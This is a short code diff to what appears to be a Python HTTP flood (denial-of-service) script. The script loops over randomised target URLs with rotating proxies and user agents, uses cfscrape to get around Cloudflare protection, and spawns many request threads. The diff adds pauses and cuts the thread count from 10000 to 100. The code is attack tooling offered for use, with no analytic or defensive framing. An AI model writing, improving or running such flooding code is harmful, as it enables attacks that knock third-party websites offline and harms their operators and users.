@@ -34,10 +34,10 @@ def requester():
     global useragents
     global targets
     while True:
-        if targets[0] == "0":continue
+        if targets[0] == "0":time.sleep(5);continue
         target = random.choice(targets).replace("%random%",randomstr()).replace("%rand%",randomstr()).replace("%randint%",randomint()).replace("%randnum%",randomint())
         proxy = random.choice(proxylist)
-        if proxy == "":print(proxy);continue
+        if proxy == "":print(proxy);time.sleep(5);continue
         s = cfscrape.create_scraper()
         try:
             useragent = random.choice(useragents)
@@ -88,7 +88,7 @@ threading.Thread(target=proxyreloader).start()
 
 def thread_starter():
     threading.Thread(target=gettargets).start()
-    for _ in range(10000):
+    for _ in range(100):
         threading.Thread(target=requester).start()
 
 threading.Thread(target=thread_starter).start()
